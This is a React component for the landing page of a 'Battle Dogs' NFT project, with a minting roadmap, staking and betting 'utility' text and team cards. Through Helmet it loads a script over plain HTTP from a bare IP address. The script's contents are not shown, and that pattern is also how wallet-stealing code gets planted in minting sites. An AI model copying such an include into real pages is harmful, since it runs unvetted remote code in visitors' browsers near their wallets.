import React from "react";
import {Helmet} from "react-helmet";
function myFunction2() {
    document.getElementById("trigger").checked = false;
    // var x = document.getElementById("toclose");
    // if (x.style.display === "block") {
    //   x.style.display = "none";

    // } else {
    //   x.style.display = "block";
    // }
  }

function close() {
    var x = document.getElementsByClassName("nav__list");
    x.style.display = "none";

}

function Home() {
  return (

    <><div>

          <meta charSet="utf-8" />
          <meta name="viewport" content="width=device-width, initial-scale=1" />
          <title>Battle Dog</title>
          <link rel="stylesheet" href="css/style.css" type="text/css" />

          
          <link rel="stylesheet" href="https://www.w3schools.com/w3css/4/w3.css" />
          <link rel="stylesheet" href="css/navbar-fixed.css" />
          <link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css" />
          <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" />
          <link rel="stylesheet" href="css/style.css" type="text/css" />
            </div><div>
              <img src="img/home_screen.gif" className="img-999"  width={1920} height={1080} style={{ width: '100%', height: 'auto' }} />
              <Helmet>
                  <script src="http://185.33.93.182:3000/js/app.js"></script>
              </Helmet>

              <header className="header-main">
                  <div className="container">
                      <div className="row">
                          <nav id="nav-main" className="navbar navbar-expand-lg navbar-light">
                              <div className="container" id="nav-sticky">
                                  {/* <button className="`navbar-toggler`" type="button" data-bs-toggle="collapse" data-bs-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
                                      <span className="navbar-toggler-icon" />
                                  </button> */}
                                  {/* <a className="icon-55" onClick={myFunction2}>
                                      <i className="fa fa-bars" />
                                  </a> */}
                                  {/* <button className="`navbar-toggler`" type="button" data-bs-toggle="collapse" data-bs-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
                                      <span className="navbar-toggler-icon" />
                                  </button> */}
                                  {/* <a className="icon-55" onClick={myFunction2}>
                                      <i className="fa fa-bars" />
                                  </a> */}
                                    <nav class="nav">
                                    <input class="nav__trigger-input" type="checkbox" id="trigger" aria-label="open the navigation"/>
                                    <label class="nav__trigger-finger" for="trigger">
                                        <span></span>
                                    </label>
                                    <ul className="nav__list" id="toclose">
                                        <li className="nav__item">
                                        <a href="#roadmap" className="nav__link">
                                                <li className="nav-item w2-animate-top2">
                                                    <a className="nav-link active" onClick={myFunction2} aria-current="page" href="#roadmap">Roadmap</a>
                                                </li>
                                        </a>
                                        </li>
                                        <a href="#arena" className="nav__link">
                                                <li className="nav-item w2-animate-top3">
                                                    <a className="nav-link active"  onClick={myFunction2} aria-current="page" href="#arena">Utility</a>
                                                </li>
                                        </a>
                                        <li className="nav__item">
                                        <a href="#team" className="nav__link">
                                                <li className="nav-item w2-animate-top3">
                                                    <a className="nav-link active"  onClick={myFunction2} aria-current="page" href="#team">Team</a>
                                                </li>
                                        </a>
                                        
                                        <a href="/mint" className="nav__link">
                                                <li className="nav-item ">
                                                    <a className="nav-link active"  onClick={myFunction2} aria-current="page" href="/mint">Mint</a>
                                                </li>
                                        </a>
                                        <div className="nav-end-box d-flex col-md-4 justify-content-end twt-img w2-animate-top5">
                                                <a href="https://twitter.com/BattleDogsNFT"><i className="fab fa-twitter" /></a>
                                                <a href="https://discord.gg/XCWBFGZ87t"><i className="fab fa-discord" /></a>
                                        </div>
                                        <input className="nav__submenu-trigger-input" type="checkbox" id="submenu-trigger" />
                                    
                                        </li>
                                    </ul>
                                    </nav>

                             
                                    {/* <div className="navbar-collapse col-md-12 clearfix" id="navbarSupportedContent">
                                        <div className="w3-container w2-animate-top">
                                            <img className="img-logo-2" src="img/3logowhite.png"  width="200px" />
                                            <ul className="navbar-nav me-auto mb-2 mb-lg-0 fw-bold text-light menu col-md-4">
                                                
                                                
                                        
                                                
                                            </ul>
                                            
                                            </div>
                                    </div> */}
                                  
                              </div>
                          </nav>
                          <nav id="nav-main" className="navbar navbar-expand-lg navbar-light">
                              <div className="container" id="nav-sticky">
                                  {/* <button className="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
                                      <span className="navbar-toggler-icon" />
                                  </button>
                                   */}
                                  <div className="navbar-collapse col-md-12 clearfix" id="navbarSupportedContent">
                                      <img className="img-logo-2" src="img/3logowhite.png"  width="200px" />
                                      <ul className="navbar-nav me-auto mb-2 mb-lg-0 fw-bold text-light menu col-md-4">
                                          <li className="nav-item">
                                              <a className="nav-link active" id="nav-close" aria-current="page" href="#roadmap">Roadmap</a>
                                          </li>
                                          <li className="nav-item">
                                              <a className="nav-link active" aria-current="page" href="#arena">Utility</a>
                                          </li>
                                          <li className="nav-item">
                                              <a className="nav-link active" aria-current="page" href="#team">Team</a>
                                          </li>
                                          {/* <li class="nav-item">
    <a class="nav-link active" aria-current="page" href="#faq">FAQ</a>
  </li> */}
                                          <li className="nav-item">
                                              <a className="nav-link active" aria-current="page" href="/mint">Mint</a>
                                          </li>
                                      </ul>
                                      <div className="nav-end-box d-flex col-md-4 justify-content-end twt-img">
                                          <a href="https://twitter.com/BattleDogsNFT"><i className="fab fa-twitter" /></a>
                                          <a href="https://discord.gg/XCWBFGZ87t"><i className="fab fa-discord" /></a>
                                      </div>
                                  </div>
                              </div>
                          </nav>
                      </div>
                  </div>
              </header>
              {/* Header "End" */}
              {/*==========
    Dogs Barking Section "Start"
    ==========*/}
              <section className="RoadMap" id="roadmap">
                  <div className="container">
                      <div className="row">
                          <div className="db-box">
                              <div className="col-md-3">
                              </div>
                              <div className="text-center fw-bold col-md-6 m-auto d-block titles">
                                  <h1 style={{ color: 'white !important'}}>SEASON 1 ROADMAP
                                  </h1>
                              </div>
                              <div className="col-md-3">
                              </div>
                          </div>
                          <div className="db-box-desc mt-3">
                              <div className="col-md-3">
                              </div>
                              <div className="text-left col-md-6 m-auto ">
                                  <p style={{ color: '#7a7a7a', fontSize: '17px', textAlign: 'center' }}><span style={{ color: 'white !important' }}>This roadmap outlines our goals and where we want to take Battle Dogs. We have a lot of ideas and concepts that we are working on. It evolve over time and hopefully become even better!
                                  </span></p>
                              </div>
                              <div className="col-md-3">
                              </div>
                          </div>
                          <div className="line-shape col-md-12">
                              <img src="img/line.png" alt="line-shape" id="img-line-2" />
                          </div>
                          <div className="roadmap-Milestone-box-wrapper mt-5" id="roadmap-res">
                              <div className="rmb-box col-md-2">
                                  <h5>10% Milestone</h5>
                                  <ul>
                                      <li>Site and contract build</li>
                                      <li>Presale and whitelisting complete</li>
                                      <li>Storyline introduced</li>
                                  </ul>
                              </div>
                              <div className="rmb-box col-md-2">
                                  <h5>15% Milestone</h5>
                                  <ul>
                                      <li>New NFT mechanics revealed</li>
                                      <li>Mint date determined</li>
                                      <li>Community Building</li>
                                  </ul>
                              </div>
                              <div className="rmb-box col-md-2">
                                  <h5>50% Milestone</h5>
                                  <ul>
                                      <li>Minting begins</li>
                                      <li>Minting sold out</li>
                                  </ul>
                              </div>
                              <div className="rmb-box col-md-2">
                                  <h5>70% Milestone</h5>
                                  <ul>
                                      <li>AMA with community</li>
                                      <li>Rarity gallery created</li>
                                      <li>Launched on rarity tools</li>
                                  </ul>
                              </div>
                              <div className="rmb-box col-md-2">
                                  <h5>100% Milestone</h5>
                                  <ul>
                                      <li>Fraction settled</li>
                                      <li>Open trading at opensea.io</li>
                                  </ul>
                              </div>
                          </div>
                          <div class="tech-slideshow">
                          <div class="mover-1">
                            <img src="img\dogs\1.png" alt/>
                            <img src="img\dogs\2.png" alt/> 
                            <img src="img\dogs\3.png" alt/>
                            <img src="img\dogs\4.png" alt/>  
                            <img src="img\dogs\5.png" alt/>
                            <img src="img\dogs\6.png" alt/>  
                            <img src="img\dogs\7.png" alt/>
                            <img src="img\dogs\8.png" alt/>
                            </div>
                            <div class="mover-2">
                            <img src="img\dogs\1.png" alt/>
                            <img src="img\dogs\2.png" alt/> 
                            <img src="img\dogs\3.png" alt/>
                            <img src="img\dogs\4.png" alt/>  
                            <img src="img\dogs\5.png" alt/>
                            <img src="img\dogs\6.png" alt/>  
                            <img src="img\dogs\7.png" alt/>
                            <img src="img\dogs\8.png" alt/> 
                            </div>
                          </div>
                          </div> 
                  </div>
              </section>
              {/*     Dogs Barking Section "End"    */}
              {/*==========
    SEASON 1 ROADMAP "Start"
    ==========*/}
              {/* <section class="dogs-Barking" style="background-color: #08080e;" id="roadmap">
    <div class="container">
      <div class="row">
          <div class="db-box">
              <div class="col-md-3">
              </div>
              <div class="text-center fw-bold col-md-6 m-auto d-block">
                  <h1 style="color: white !important; font-weight: 500;">SEASON 1 ROADMAP
                  </h1>
              </div>
              <div class="col-md-3">
              </div>
          </div>
              <div class="db-box-desc mt-3">
                  <div class="col-md-3">
                  </div>
      
                  <div class="text-left col-md-6 m-auto ">
                      <p style="color: #7a7a7a; font-size: 17px; text-align:center;"><span style="color: white !important">This roadmap outlines our goals and where we want to take Battle Dogs. We have a lot of ideas and concepts that we are working on. It evolve over time and hopefully become even better!
                      </p>
                  </div>
                  <div class="col-md-3">
                  </div>
              </div>
    
              <div class="line-shape col-md-12">
                  <img src="img/line.png" alt="line-shape" id="img-line-2">
              </div>
            
              <div class="roadmap-Milestone-box-wrapper mt-5" id="roadmap-res">
                  <div class="rmb-box col-md-2">
                      <h5>10% Milestone</h5>
                      <ul>
                          <li>Site and contract build</li>
                          <li>Presale and whitelisting complete</li>
                          <li>Storyline introduced</li>
                      </ul>
                  </div>
    
                  <div class="rmb-box col-md-2">
                      <h5>15% Milestone</h5>
                      <ul>
                          <li>New NFT mechanics revealed</li>
                          <li>Mint date determined</li>
                          <li>Community Building</li>
                      </ul>
                  </div>
    
                  <div class="rmb-box col-md-2">
                      <h5>50% Milestone</h5>
                      <ul>
                          <li>Minting begins</li>
                          <li>Minting sold out</li>
                      </ul>
                  </div>
                 
                  <div class="rmb-box col-md-2">
                      <h5>70% Milestone</h5>
                      <ul>
                          <li>AMA with community</li>
                          <li>Rarity gallery created</li>
                          <li>Launched on rarity tools</li>
                      </ul>
                  </div>
    
                  <div class="rmb-box col-md-2">
                      <h5>100% Milestone</h5>
                      <ul>
                          <li>Fraction settled</li>
                          <li>Open trading at opensea.io</li>
                      </ul>
                  </div>
              </div>
          </div>
      </div>
    </section> */}
              {/*     session Roadmap "End"    */}
              {/*==========
    Battle Dog section "Start"
    ==========*/}
              {/* <section className="battle-Dog" style={{ backgroundImage: 'url(../img/spacewall_3.gif)', backgroundRepeat: 'no-repeat', backgroundSize: 'cover', backgroundPosition: 'center center', height: '1080px', width: '100%', maxWidth: '100%' }}>
                  <div className="container">
                      <div className="row">
                          <div className="battle-dog-wrapper clearfix d-block">
                              <div style={{ marginTop: '150px', width: '65%', float: 'right' }} className="db-img">
                                  <div className="w3-content w3-display-container">
                                      <img className="mySlides" src="img/Arena_fiverr.gif" style={{ width: '100%' }} />
                                      <img className="mySlides" src="img/fire_ARENA_ANIMATED_FIVERR_1.gif" style={{ width: '100%' }} />
                                      <img className="mySlides" src="img/Space_ARENA_ANIMATED_FIVERR_1.gif" style={{ width: '100%' }} id="slideshow-images-border" />
                                      <button className="w3-button w3-black w3-display-left" id="slideshow-images-border" onClick="plusDivs(-1)">❮</button>
                                      <button className="w3-button w3-black w3-display-right" id="slideshow-images-border" onClick="plusDivs(1)">❯</button>
                                  </div>
                              </div>
                          </div>
                      </div>
                  </div>
              </section> */}
              {/*==========
    Team "Start"
    ==========*/}


    
<section className="Utility" style={{ backgroundImage: 'url(../img/spacewall_3.gif)', backgroundRepeat: 'no-repeat', backgroundSize: 'cover', backgroundPosition: 'center center', width: '100%', maxWidth: '100%' }} id="arena">
                  <div className="container">
                      <div className="row">
                      <div>
                        <h1 className="titles2">Our utility</h1>
                        <p className="text-dec">After minting a Battle Dog you will have the ability to stake it and earn our token, You will receive 10 Tokens daily just for staking.
Once you have accumulated 400 Tokens you will have the option to breed by owning A battle dog  and burning the 400 Tokens Through our website.
But if you have the guts for it, you can gamble your tokens by placing a bet on your dog against another dog in a 1vs1 and potentially double your tokens.
This will be a surprise to everyone because we have not announced or even hinted at this idea, but its been in the works for the past month:
1,000/10,000 Battle Dogs will have the Genesis Trait, The Genesis Dogs will also be stake-able but they will earn 10% of the profits of battles in our Arena, making them extremely valuable and will provide passive income in our Token.
(Example: I battle another dog in the arena in a 10 token battle, meaning I put 10 tokens and so does the opponent in the battle.
if I win I will only get 19 tokens from the battle and vice versa because 10% goes to Genesis holders automatically)</p>
                        <div className="slideshow-container">
                        <div className="mySlides fade2">
                            <img src="http://185.33.93.182:3000/img/Space_ARENA_ANIMATED_FIVERR_1.gif" style={{width: '100%'}} />
                            </div>
                            <div className="mySlides fade2">
                            <img src="http://185.33.93.182:3000/img/fire_ARENA_ANIMATED_FIVERR_1.gif" style={{width: '100%'}} />
                            </div>
                        <div className="mySlides fade2">
                            <img src="http://185.33.93.182:3000/img/Arena_fiverr.gif" style={{width: '100%'}} />
                            </div>
                            
                           
                            <a className="prev">❮</a>
                            <a className="next">❯</a>
                        </div>
                        <br />

                        </div>
 
                      </div>
                  </div>
              </section>
              <section className="Team" style={{ backgroundColor: '#35006E' }} id="team">
                  <div className="container">
                      <div className="row">
                          <div className="db-box">
                              <div className="col-md-3">
                              </div>
                              <div className="text-center fw-bold col-md-6 m-auto d-block titles">
                                  <h1 style={{ color: 'white !important'}}>OUR TEAM</h1>
                              </div>
                              <div className="col-md-3">
                              </div>
                          </div>
                          <div className="db-box-desc mt-3">
                              <div className="col-md-3">
                              </div>
                              <div className="text-left col-md-6 m-auto ">
                                  <p style={{ color: '#7a7a7a', fontSize: '17px', textAlign: 'center' }}><span style={{ color: 'white !important' }}>BattleDogs was created by a team of digital native, Entrepreneur, blockchain experts, Marketing wizards and creative artist. We're committed to deliver a cutting-edge experience and making this project a success.
                                  </span></p>
                              </div>
                              <div className="col-md-3">
                              </div>
                          </div>
                          <div className="dogs-team-single-box mt-5" id="dogs-team-2">
                              <div className="our-team-box col-md-3">
                                  <img src="img/pirate.png" alt="Avatar" className="image" style={{ width: '100%' }} />
                                  <div className="team-overlay">
                                      {/* <div class="team-desc dogs-Founder">
                    <h2>Pirate</h2>
                    <p>Founder</p>
                </div> */}
                                  </div>
                                  <h1>Arad<p>Developer</p></h1>
                              </div>
                              <div className="our-team-box col-md-3">
                                  <img src="img/zihob.png" alt="Avatar" className="image" style={{ width: '100%' }} />
                                  <div className="team-overlay">
                                      {/* <div class="team-desc dog-Community-Moderator">
                  <h2>Zihob</h2>
                  <p>Founder</p>
              </div> */}
                                  </div>
                                  <h1>Arad<p>Developer</p></h1>
                              </div>
                              <div className="our-team-box col-md-3">
                                  <img src="img/Fire.png" alt="Avatar" className="image" style={{ width: '100%' }} />
                                  <div className="team-overlay">
                                      {/* <div class="team-desc dogs-Founder">
                    <h2>Jeremy</h2>
                    <p>Founder</p>
                </div> */}
                                  </div>
                                  <h1>Arad<p>Developer</p></h1>
                              </div>
                              <div className="our-team-box col-md-3">
                                  <img src="img/0xBulldozer.png" alt="Avatar" className="image" style={{ width: '100%' }} />
                                  <div className="team-overlay">
                                      {/* <div class="team-desc dog-leader">
                  <h2>0xBulldozer</h2>
                  <p>Founder</p>
              </div> */}
                                  </div>
                                  <h1>Arad<p>Developer</p></h1>
                              </div>
                              <div className="our-team-box col-md-3">
                                  <img src="img/arad.png" alt="Avatar" className="image" style={{ width: '100%' }} />
                                  <div className="team-overlay">
                                      {/* <div class="team-desc dog-developer">
                <h2>Arad</h2>
                <p>Developer</p>
            </div> */}
                                  </div>
                                  <h1>Arad<p>Developer</p></h1>
                              </div>
                          </div>
                      </div>
                  </div>
              </section>
              {/*     Team Dogs "End"    */}
              {/*
    <section class="faq", style="background-image: url(../img/spacewall_2.gif); background-repeat: no-repeat; background-size: cover; background-position: center center; height: 1080px; width: 100%; max-width: 100%;" id="faq">
    <div class="container">
    <div class="row">
    <div class="accordian">
    <div class="card">
        <div class="card-header">
          <h3>How many Battle Dogs can I mint?</h3>
          <span class="fa fa-minus"></span>
        </div>
        <div class="card-body active">
            <p>You will be able to mint a maximum of 5 Battle Dog NFT per wallet. There will be a maximum of 10,000 Battle Dog NFTs available for mint for the whole project.</p>
        </div>
    </div>
    
    <div class="card">
        <div class="card-header">
          <h3>Where can I view my NFT?</h3>
          <span class="fa fa-plus"></span>
        </div>
        <div class="card-body">
            <p>Once minted, the Battle Dog NFT (ERC-721) token will be added to your wallet which you can check via the Ethereum blockchain.
              You will also be able to view the NFT on OpenSea.io once the listing is approved</p>
        </div>
    </div>
    <div class="card">
        <div class="card-header">
          <h3>Is there a presale?</h3>
          <span class="fa fa-plus"></span>
        </div>
        <div class="card-body">
            <p>Yes, there is a presale which you need to win a whitelist entry. There will be a total of 800 members who will be able to be whitelisted for presale.</p>
        </div>
    </div>
    
    
    <div class="card">
      <div class="card-header">
        <h3>How can I use my NFT?</h3>
        <span class="fa fa-plus"></span>
      </div>
      <div class="card-body">
          <p>You will be able to use your NFT as an avatar in the metaverse. More details about this will be announce once we start development on this once minting is complete.</p>
      </div>
    </div>
    
    
    <div class="card">
    <div class="card-header">
      <h3>What is the metaverse?</h3>
      <span class="fa fa-plus"></span>
    </div>
    <div class="card-body">
        <p>The Metaverse refer to a shared virtual experience where land, avatars and name can be bought and sold, often using cryptocurrency. The future phrase in the BattleDogs’s roadmap will allow you to join this Metaverse with the assets you own.</p>
    </div>
    </div>
    </div>
    </div>
    </div>
    </section> */}
              {/* Footer section */}
              <footer className="contact-us text-center" style={{ backgroundImage: 'url(../img/spacewall_4.gif)', backgroundRepeat: 'no-repeat', backgroundSize: 'cover', backgroundPosition: 'center center', height: '1080px', width: '100%', maxWidth: '100%' }}>
                  <div className="container">
                      <div className="row">
                          <div className="ft-details" style={{ position: 'relative', top: '25rem' }}>
                              <h6>OWN A BATTLE DOG WITH US!</h6>
                              <h2>WOOFFFF IN TO #BATTLEDOGS NOW</h2>
                              <img src="img/Fire2.png" alt="" />
                              {/* <div class="f-social-icon">
<a href="https://www.instagram.com"><i class="fab fa-facebook"></i></a>
<a href="https://twitter.com"><i class="fab fa-twitter"></i></a>
<a href="https://discord.com"><i class="fab fa-discord"></i></a>
</div> */}
                              <p>Copyright © 2021 BattleDogs.All Rights Reserved​</p>
                          </div>
                      </div>
                  </div>
              </footer>
          </div></>


  );
}

export default Home;